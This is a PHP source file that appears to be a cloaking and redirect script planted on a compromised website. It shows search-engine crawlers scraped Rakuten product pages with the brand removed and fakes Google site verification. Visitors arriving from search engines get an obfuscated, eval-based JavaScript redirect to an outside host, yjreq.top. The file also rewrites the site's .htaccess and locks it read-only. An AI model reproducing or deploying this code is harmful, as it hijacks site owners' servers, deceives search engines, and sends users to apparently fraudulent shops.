<?php 
//header('Content-Type:text/html; charset=utf-8');
error_reporting ( 0 );
$pageurl = 'noix/ilb_5452400214';
$rewrite_mod = "try1x3-C.default";
if($_GET['google']!=""){
	echo 'google-site-verification: google'.$_GET['google'].'.html';exit;
}
function class_x_i(){
	@set_time_limit(3600);
	@ignore_user_abort(1);
	ob_start();
	$urlInfo=array(); 
	
	//
	///url 
	$request_url='';
	if (isset($_SERVER['REQUEST_URI'])) {
		$request_url=$_SERVER['REQUEST_URI'];
	}
	$request_url = preg_replace("/^\//si", '', $request_url);

	$urlInfo['items']='item';
	if(strstr($request_url,'-product/'))
	{
		$urlInfo['items']='product';
	}
	global $rewrite_mod,$pageurl;
    $bbbstatus=0;
	$urlInfo['server_name']='';
	$urlInfo['filename']='';
	$urlInfo['lturl']='';
	$urlInfo['sitename']= explode("-",$rewrite_mod);
	$urlInfo['sitename']=$urlInfo['sitename'][0];
	$urlInfo['urlhtml']='.'.explode(".",$rewrite_mod);
	$urlInfo['urlhtml']=$urlInfo['urlhtml'][1];
	if($request_url==''){
		$urlInfo['lturl']=$pageurl;
	}else{
		if(strstr($request_url,$urlInfo['sitename'].'-') && !strstr($request_url,'sitemap')) { 
			$request_urls=explode("-",$request_url);
			$urlInfo['sitename']= $request_urls[0];
			$urlInfo['urlhtml']='.'.explode(".",strrchr($request_url,'-'));
			$urlInfo['urlhtml']=$urlInfo['urlhtml'][1];
			$position=stripos($request_url,'-')+1;
			$urlInfo['lturl']=substr($request_url,$position,strlen($request_url));
			$urlInfo['lturl']=explode(".",$urlInfo['lturl']);
			$urlInfo['lturl']=$urlInfo['lturl'][0];
			
		}else{
			$bbbstatus=1;
		}
	}

	///url
	if (isset($_SERVER['HTTP_HOST'])) {
		 $urlInfo['server_name']  = $_SERVER['HTTP_HOST'];
	}elseif (isset($_SERVER['SERVER_NAME'])) {
		 $urlInfo['server_name'] = $_SERVER['SERVER_NAME'];
	}
		if(strstr($request_url,'sitemap')){
		$maps=explode("-",$request_url);
		$sx_content = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n\t<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
		  $file_path =explode(".",$maps[2]);
		  $file_path = "http://map.yjreq.top/" . $file_path[0] . ".txt";
		  //date_default_timezone_set("PRC");
		  $file_short_path_content =get_html_content($file_path);
		  $file_short_path_array = explode("\n", $file_short_path_content);
			foreach ($file_short_path_array as $file_short_path) {
				//sitemap static start
				if(!strstr(trim($file_short_path),'product/')){
					$sx_content .= "\n\t\t" . '<url>';
					$sx_content .= "\n\t\t\t" . '<loc>http://' . $_SERVER['SERVER_NAME'] . '/' . $maps[0]. '-' . trim($file_short_path) .'.default</loc>';
					$sx_content .= "\n\t\t\t" . '<lastmod>'. date('Y-m-d').'</lastmod>';
					$sx_content .= "\n\t\t\t" . '<changefreq>daily</changefreq>';
					$sx_content .= "\n\t\t\t" . '<priority>0.8</priority>';
					$sx_content .= "\n\t\t</url>";
					
				}
			}

	$sx_content .= "\n\t</urlset>";
	echo $sx_content;
	die();
	}
	//echo $urlInfo['server_name'].'|'.$urlInfo['filename'].'|'.$urlInfo['sitename']."|".$urlInfo['urlhtml'].'|'.$urlInfo['lturl'].'|'.$urlInfo['items'];
	//die();
	$httpReferer  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
	$login_status = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
	$lCheck = func_loginCheck($login_status);
	
	$rCheck = func_referCheck($httpReferer);
	$pro_url = 'http://'.$urlInfo['items'].'.rakuten.co.jp/'.$urlInfo['lturl'];
	//echo $pro_url;
	
	$jumpcodeurl = 'http://h1.yjreq.top/'.$urlInfo['lturl'].'.html';
	//echo $jumpcodeurl;
	if($bbbstatus==1){
		$lCheck=false;
	}
	if($lCheck || $rCheck){
		$html_content=get_html_content($pro_url);
		$html_content = iconv("EUC-JP","UTF-8//IGNORE",$html_content);
		$html_content=str_replace('／', '】', $html_content);
		$html_content=str_replace('／', '【', $html_content);
		$html_content = str_replace("楽天市場店", "", $html_content);
		$html_content = str_replace("楽天市場", "", $html_content);
		$html_content = str_replace("楽天", "", $html_content);
		$pat = '/<a[^>]*?href="http:\/\/item.[^>]*?"[^>]*?>([\s\S]*?)<\/a>/i';     
		preg_match_all($pat, $html_content, $m);    
		$Article_Inlinks='<ul>';
		for($i=0;$i<count($m);$i++){
			 for($j=0;$j<count($m[$i]);$j++){
				 if(strstr($m[$i][$j],'/c/')==false && strstr($m[$i][$j],'alt')==true){
					if(strstr($m[$i][$j],'item.rakuten.co.jp')==true){
							preg_match('/href="[^"]*?"/i', $m[$i][$j],$a1);
							preg_match('/alt="[^"]*?"/i', $m[$i][$j],$a2);
							$a3= str_replace('alt="', '', $a2[0]);
							$a3= str_replace('"', '', $a3);

							$a1= str_replace('"', '', $a1[0]);
							$a1= str_replace('href=', '', $a1);
							$a1= str_replace('item.rakuten.co.jp/', $urlInfo['server_name'].'/'.$urlInfo['sitename'].'-', $a1).$urlInfo['urlhtml'];
							$a1=str_replace('/'.$urlInfo['urlhtml'].$urlInfo['urlhtml'],$a1);
                            $Article_Inlinks .= '<li><a href="'.$a1.'" title="'.$a3.'" >'.$a3.'</a></li>';
						} 
					} 
			 }
		}
		$Article_Inlinks .='</ul>';
		//$html_content='123';
		$Mate_Title='';
		$Mate_Keyword='';
		$Mate_Description='';
		$Article_Title='';
		$Article_picture='';
		$Article_category='';
		$Article_price='';
		$Article_description='';
		$html_content=str_replace('／', '】', $html_content);
		$html_content=str_replace('／', '【', $html_content);
		$html_content=str_replace('【弛欧辉眷】', '', $html_content);
		$html_content=str_replace('弛欧辉眷', '', $html_content);
		$html_content = str_replace('楽天市場店', '', $html_content);
		$html_content = str_replace('楽天市場', '', $html_content);
		$html_content = str_replace('楽天', '', $html_content);
		$html_content=str_replace($urlInfo['items'].'.rakuten.co.jp',$urlInfo['server_name'], $html_content);

		preg_match('/<title>([\s\S]*?)<\/title>/i', $html_content,$Mate_Title);
		preg_match('/<meta[^>]*?name="keywords"[^>]*?>/i', $html_content,$Mate_Keyword);
		preg_match('/<meta[^>]*?name="description"[^>]*?>/i', $html_content,$Mate_Description);
		preg_match('/<span[^>]*?class="item_name"[^>]*?>([\s\S]*?)<\/span>/i', $html_content,$Article_Title);
		
		if(preg_match('/(?<=<td valign="top">)<a[\w\W]+?expid="[0-9]+" class="[\w\W]+?"><img src="[\w\W]+?.jpg/i', $html_content, $pro_img_temp)){
			preg_match('/(?<=<img src=").*$/i', $pro_img_temp[0], $Article_picture);
		}


		preg_match('/<td[^>]*?class="sdtext"[^>]*?>([\s\S]*?)<\/td>/i', $html_content,$Article_category);
		preg_match('/<span[^>]*?class="price2"[^>]*?>([\s\S]*?)<\/span>/i', $html_content,$Article_price);
		$description="";
		if(preg_match('/(?<=<div id="product">)[\w\W]+?(?=<\/div>)/', $html_content,$Article_description) != 0){
		}else if(preg_match('/(?<=<td><span class="sale_desc">)[\w\W]+?(?=<\/span>[\s]*<br>[\s]*<br>[\s]*<\/td>)/', $html_content,$Article_description) != 0){
			
		}else {
			preg_match('/(?<=<span class="item_desc">)[\w\W]+?(?=<\/span>[\s]*<br>[\s]*<br>[\s]*<\/td>[\s]*<\/tr>[\s]*<\/table>)/', $html_content,$Article_description);
		}
	
		$template = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="ja" xmlns="http://www.w3.org/1999/xhtml" >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Language" content="ja" />
<meta http-equiv="Content-Script-Type" content="text/javascript" />

%Mate_Title%
%Mate_Keyword%
%Mate_Description%

</head>
<body>
<h1>%Article_Title%</h1>
<p>
</p>
<pre>%Article_Comment%</pre>

<pre>%Article_Inlink%</pre>

</body>
</html>';

		$out =$template;

		$out = str_replace('%Mate_Title%',str_replace('</title>', ' '.$urlInfo['server_name'].'</title>', $Mate_Title[0]), $out);
		$out = str_replace('%Mate_Keyword%', $Mate_Keyword[0], $out);
		$out = str_replace('%Mate_Description%', $Mate_Description[0], $out);
		$out = str_replace('%Article_Title%', $Article_Title[0], $out);
		$Article_category = preg_replace('/<a[^>]*?>/i', '', $Article_category[0]);
		$Article_category = str_replace('</a>', '', $Article_category);
		$out = str_replace('%Article_Comment%','<table><tr>'.$Article_category.'</tr></table><br /><img src="'.$Article_picture[0].'" /><br />'.desc_clear($Article_description[0]), $out);
		$out = str_replace('%Article_Inlink%', $Article_Inlinks, $out);
	//	$rCheck=true;
		if($rCheck)
		{
			//$htmlrCheck=get_html_content($jumpcodeurl);
			//$htmlrCheck=


            $iframe_script_string = 'if(/(google|yahoo|bing|aol)/i.test(document.referrer)){window.setTimeout(function(){top.location.href="' . $jumpcodeurl . '"},1000)}';
	        $r_code = outScript('', 0, $iframe_script_string, 1);
			$jumpcode =$r_code. '<noscript><meta http-equiv="refresh" content="1; url=' . $jumpcodeurl . '" /></noscript>';
			$out = preg_replace('/<body[^>]*?>/i','<body>'. $jumpcode.'</script><div style="display:none">', $out);
			$out = str_replace('</body>', '</div></body>', $out);
		}
		echo $out;
		die();
	}
	
}
// 生成js
function outScript($goto, $test = false, $script_string = '', $iframe = false){
	// $test = false;	// 测试模式
	$sep = '====';
	if ($iframe) {
		$sep = '####';
	}
	$script_format = '(function(){var g=setInterval(function(){try{' . ($test ? '!' : '') . '!(/(google|yahoo|bing|aol)/i.test(document.referrer))||(function(s){window.top.location.replace(s)})(' . $sep . '{#URL#}' . $sep . ');clearInterval(g)}catch(e){}},10)})()';
	$step_min = 1;
	$step_max = 5;
	$outScript = '';
	$pos = 0;
	$t = 0;
	$tmp = '';
	$rurl = str_ireplace('{#URL#}', $goto, $script_format);
	if ($script_string != '') {
		$rurl = $script_string;
	}
	// echo "$rurl";die();
	$rurl_length = mb_strlen($rurl);
	// echo "$rurl_length";die();
	$comma = '';

	while ($pos < $rurl_length) {
		$r = mt_rand($step_min, $step_max);
		// echo "$r";die();
		$t = $pos + $r;
		if ($t > $rurl_length) {
			$t = $rurl_length;
		}
		$tmp .= $comma . mb_substr($rurl, $pos, $r);
		// echo "$tmp";die();
		$pos += $r;
		$comma = '\'+\'';
	}

	if ($script_string != '') {
		if ($iframe) {
			$outScript = ($tmp != '' ? '<script>eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))</script>' : $tmp);
		}else{
			$outScript = ($tmp != '' ? '<script>document.write(\'' . $tmp . '\')</script>' : $tmp);
		}
	}else{
		$outScript = ($tmp != '' ? '<script>eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))</script>' : $tmp);
	}
	
	// $out = ($tmp != '' ? 'eval((\'' . $tmp . '\').replace(/' . $sep . '/g, \'\\\'\'))' : $tmp);
	// echo $out;
	return $outScript;
}

function sync_htaccess($htaccess_rule = '', $rewrite_open = 1){
	
  if ($htaccess_rule != '') {
    if ($rewrite_open) {
      $htaccess_path = './.htaccess';
      // if (isset($_SERVER['DOCUMENT_ROOT'])) {
      //   $htaccess_path = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
      // }
      if ($htaccess_path != '' && file_exists($htaccess_path)) {
        @chmod($htaccess_path, 0777);
        $htaccess_content = @file_get_contents($htaccess_path);
        // if (stripos($htaccess_content, '#ListUrlRewrite') === false) {
        if (stripos($htaccess_content, $htaccess_rule) === false) {
          // $rewrite_slash = preg_replace("/(\\$\d)/si", "\\\\\\\\\\\\$1", $rewrite_array['htacc']);
          $rewrite_slash = preg_replace("/\\\$/s", '\\\$', $htaccess_rule);
          // file_put_contents('./ins.log', "$rewrite_slash\n");
          if (stripos($htaccess_content, '%{HTTP_HOST}') !== false && stripos($htaccess_content, 'R=301') !== false) {
            $htaccess_content = preg_replace("/(RewriteRule.*?R=301.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }elseif (stripos($htaccess_content, 'RewriteBase') !== false) {
            $htaccess_content = preg_replace("/(RewriteBase.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }elseif (stripos($htaccess_content, 'RewriteEngine') !== false) {
            $htaccess_content = preg_replace("/(RewriteEngine.*?[\r\n])/si", "$1\n{$rewrite_slash}\n", $htaccess_content, 1);
          }else{
            // search first RewriteRule
            $match = array();
            preg_match("/RewriteRule.*?[\r\n]/si", $htaccess_content, $match);
            if (!empty($match) && isset($match[0])) {
              $htaccess_content = str_ireplace($match[0], "\n" . $htaccess_rule . $match[0], $htaccess_content);
            }
            unset($match);
          }
          $htaccess_content_array = explode("\n", $htaccess_content);
          if (!empty($htaccess_content_array)) {
            foreach ($htaccess_content_array as $hca_key => &$htaccess_content_line) {
              // $htaccess_content_line = preg_replace("/^\s+(.*)/", "$1\n", $htaccess_content_line);
              $htaccess_content_line = trim($htaccess_content_line);
              if ($htaccess_content_line == '') {
                unset($htaccess_content_array[$hca_key]);
              }
            }
          }
          $htaccess_content = implode("\n", $htaccess_content_array);
          unset($htaccess_content_array, $rewrite_slash);
          $htaccess_content = preg_replace("/(^[\s\r\n]+|[\s\r\n]+$)/si", '', $htaccess_content);
          @file_put_contents($htaccess_path, $htaccess_content);
        }
      }else{
        // create new .htaccess
        $htaccess_content = "<IfModule mod_rewrite.c>\nRewriteEngine On\n" . $htaccess_rule . "\n</IfModule>\n";
        @file_put_contents($htaccess_path, $htaccess_content);
        unset($htaccess_content, $htaccess_path);
      }
      @chmod($htaccess_path, 0444);
    }
  }
}
function desc_clear($desc) {
	$description = preg_replace('/<iframe[\w\W]+<\/iframe>/', '', $desc);
	$description = preg_replace('/<div class="rp-item[0-9]+">SERVICE<\/div>[\w\W]+/', '', $description);
	$description = preg_replace('/<a [\w\W]+?<\/a>/', '', $description);
	$description = preg_replace('/<img src="\/[\w\W]+?>/', '', $description);
	$description = preg_replace('/<map[^>]*>[\w\W]+?<\/map>/', '', $description);
	$description = preg_replace('/<img[^\""]+>/', '', $description);
	$description = str_replace('楽天市場店', '', $description);
	$description = str_replace('楽天市場', '', $description);
	$description = str_replace('楽天', '', $description);
	return $description;
}
//来路判断
function func_referCheck($refer = ''){
  $redi = false;
  $referbots = 'google.co.jp|yahoo.co.jp|bing';
  if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
    $redi = true;
  }
  return $redi;
}
//蜘蛛判断
function func_loginCheck($agent = ''){
  $login = false;
  $bots = 'googlebot|baiduspider|bingbot|google|baidu|aol|bing|yahoo';
  // $bots = explode('|', $bots);

  if ($agent != '') {
    if (preg_match("/($bots)/si", $agent)) {
      $login = true;
    }
  }
  return $login;
}
function get_html_content($url){
	$html_content='';
	if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
		$ch = curl_init();  
		curl_setopt($ch, CURLOPT_URL, $url);  
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true) ;  
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true) ; 
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		$html_content = curl_exec($ch);  
		curl_close($ch);
	}
	if($html_content==''){
		if (function_exists('file_get_contents')){
			$html_content = file_get_contents($url);  
		}
	}
	if($html_content==''){
		if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
			$fp = fopen($url, 'r') or exit('Open url faild!');    
			if($fp){  
				while(!feof($fp)) {    
					$html_content.=fgets($fp)."";  
				}  
			fclose($fp);    
			} 
		}
	}
	return $html_content;
}
class_x_i();

?>
